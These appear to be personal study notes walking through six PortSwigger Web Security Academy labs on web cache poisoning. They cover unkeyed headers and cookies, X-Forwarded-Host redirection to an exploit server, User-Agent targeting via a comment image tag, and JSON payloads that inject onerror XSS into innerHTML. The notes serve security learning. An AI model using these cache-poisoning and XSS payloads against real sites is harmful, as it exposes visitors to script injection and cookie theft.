# Web cache poisoning

- https://portswigger.net/web-security/web-cache-poisoning
- https://portswigger.net/research/practical-web-cache-poisoning
- https://portswigger.net/research/web-cache-entanglement
- https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws

We are looking for unkeyed values (headers, params), that are being reflected on the response page.

## Web cache poisoning with an unkeyed header

We can find out that the cache is probably being used by headers like `X-Cache: hit` or `X-Cache: miss`. In order to successfully test for cache poisoning we can use a cache buster (such as a unique parameter), that will limit the response to us only.

Using Param Miner we can find out, that the server supports `X-Forwarded-Host` header and once provided its value is being reflected in the address of the tracking js script that should be loaded. `Guess headers` with added options like `poison only` and `cache buster` will try to find and report only valueable output.

Now we can create a `/resources/js/tracking.js` file at our exploit server containing `alert(document.cookie)` script, and poison a cache to the home poge at `/` with `X-Forwarded-Host` header pointing to `exploit-0af1000703699b68801bdebc0129001c.exploit-server.net`, making every next request maching cache keys receive a page loading our malicious script instead of the tracking one.

## Web cache poisoning with an unkeyed cookie

The `fehost` cookie is being set upon hitting the cache for the first time and its value is then reflected on the page in a script tag. 

Upon adding custom cache buster (`?cb=123` query param) we can notice that changing the cookie value to `XXX`, performing a request that misses cache, and the performing other request with cookie set to `YYY` responds with `XXX` being reflected on the page, which proves the cookie is unkeyed value.

Chaning the cookie value to `prod-cache-01"};alert(1);x={"a":"b` with custom cache buster and then requesting the same page with normal cookie discovers that the reflected value is not being sanitizd and we are able to execute arbitrary code and poison a cache with it, which done again withour cache buster solves the lab.

## Web cache poisoning with multiple headers

Using Param Miner we are able to establish, that `x-forwarded-scheme` and `x-forwarded-host` headers are supported.

By adding `X-Forwarded-Scheme: http` to the request we notice 302 responde with redirection to the original host. Upon removing this header and leaving the same cache buster we still receive the redirection request.

When we add to that `X-Forwarded-Host: XXXX` header, we can notice redirection location now points to `XXXX` and after removing both headers, we see that the response was cached.

By adding the two below headers to the `GET /` request we are able to redirect anyone visiting the home to our server containing a malicious script.

```
X-Forwarded-Host: exploit-0aea00e203731cf781f556c601a60079.exploit-server.net/exploit
X-Forwarded-Scheme: http
```

Since this does not have as much of an impact, we have to investigate further. We can notice that a request for a tracking js script `GET /resources/js/tracking.js` is also cacheable, and applying the same headers also causes it to poison the cache. Adding the below two headers will cache the response for requesting the tracking script, that will redirect to our domain.

```
X-Forwarded-Host: exploit-0aea00e203731cf781f556c601a60079.exploit-server.net
X-Forwarded-Scheme: http
```

Hosting our custom js file containing `alert(document.cookie)` along side with poisoning the cache of the previous request makes everyone accessing the home page trigger an XSS and solve the lab.

## Targeted web cache poisoning using an unknown header

Using Param Miner we are able to discover that `x-host` header is supported.

By testing this param we can notice that its value is being reflected in the path to tracking js script and that the param is unkeyed.

By performing `GET /post?postId=1` request with `X-Host: exploit-0a170084036989dd8247205801bb009d.exploit-server.net` header we are able to poison a cache, which will then make a every request to js tracking script to our server, on which we will host `alert(document.cookie)` content. Everyone visitng the post page will trigger an XSS performing alert function call.

Now in order to target the specific user, we need to get their `User-Agent`. This can be done by creating a new comment containing a link to our server. After visitng this post the `user-agent` will be logged. For this we create a new comment with a body:

```
<img src="https://exploit-0a170084036989dd8247205801bb009d.exploit-server.net/img.png" />
```

Now reading fromthe logs we notice the `user-agent` of the victim `Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36`.

Now we again perform poisoning the cache for the `/post?postId=1`, but this time changing the request `user-agent` to the victims one and adding `Vary: User-Agent`. By this we will add to cache key particular `User-Agent`, limiting the cache poisoning only to that particular one, which after creating a new comment solves the lab.

## Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

By inspecting the loaded content we can notice `geolocate.js` script, which fetches the content from provided as param url and passes it without sanitization into `innerHtml` sink.

The function `initGeoLocate` performing this action is invoked in the main page and uses the param `data.host`, which is defined in other part of the file in different `script` tag.

Param Miner was able to find `x-forwarded-host` header and we can confirm that it is being reflected in the `data.host` param, which, if poisoned, could potentially trigger an XXS by pointing it to our server, which will serve a payload passed to `innerHtml` sink.

Using `x-forwarded-host` header we are able to poison the cache, which for further requests not containing the header still respond with reflected malicious host value. `session` cookie and `User-Agent` header seem to be unkeyed values.

Now we can poison home page by performing `GET /` request with `X-Forwarded-Host: exploit-0ae0008c04b99d6f80a99890016d00b3.exploit-server.net` header. The Exploit server neet to be configured to serve proper file and respond with proper headers.

File should be available at path `/resources/json/geolocate.json`. The headers should support CORS and have proper for json content type set:

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: https://0ab8005b04999d5280dc99e3003f0003.web-security-academy.net
```

The content of the response should be a json, which `country` param will be unsafetly passed to `innerHtml` sink:

```
{
    "country": "United Kingdom <img src=X onerror=alert(document.cookie) />"
}
```

Poisoning the cache this way and serving this file solves the lab.

## Combining web cache poisoning vulnerabilities

Using Para Miner we are able to locate `x-forwarded-host` and `x-original-url` headers that are supported.

Same situation as in the previous labs with poisoning the host in `data.host` variable which then is used to fetch data and pass in without sanitization to `innerHtml` sink. `x-forwarded-host` is unkeyed but is again reflected on the page, which makes the same technique usable.

The problem here is that the English language chosen by default by victim is not translated and no unsafe `innerHtml` call would be invoked. That is guarded by `lang.toLowerCase() !== 'en'` check, so modifying response to contain malicious translation for english would not work. `select` tag options are created using the same response, but with `innerText`.

By performing regular request to `/` and then adding `X-Original-Url: /setlang/es`, we notice that we receive `X-Cache: hit`, which means we hit the cache, so the `X-Original-Url` is unkeyed. After waiting for a while, sending regular request to the `/` with that header, results in language change, setting new language and performing redirection with a new query param `localized=1`. This means we could potentially posiono `/` to change a language and poison `/?localized=1` to fetch malicious data from our server to perform XSS.

Ufortunately this 302 redirection response cannot be cached, because it contains the `Set-Cookie` header. But if we change `X-Original-Url` value to `/setlang\en` will perform redirect to `/setlang/en` and cache it.

Now we have all the pieces to solve the lab. First poison `/` path with `X-Original-Url: /setlang\es`. Next poison `/?localized=1` with `X-Forwarded-Host: exploit-0a1b008804c63040828ddc8201e100d9.exploit-server.net` and then prepare our malicious payload which will be donwloaded.

File should be available at `/resources/json/translations.json` and contain:

```
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "espaÃ±ol",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "Ver detailes <img src=X onerror=alert(document.cookie) />",
            "Description:": "DescripciÃ³n:"
        }
    }
}
```

Response header should be configured to allow CORS:

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: https://0a17008b045e30d882a6dd2500a2007a.web-security-academy.net
```

Everyone visiting `/` home page will receive cached redirection to language change and then to `/?localized=1` with cookie set to Espaniol. Poisoned `/?localized=1` with reflected host header will fetch the data from our malicious server and pass unsafely to `innerHtml` solving the lab.
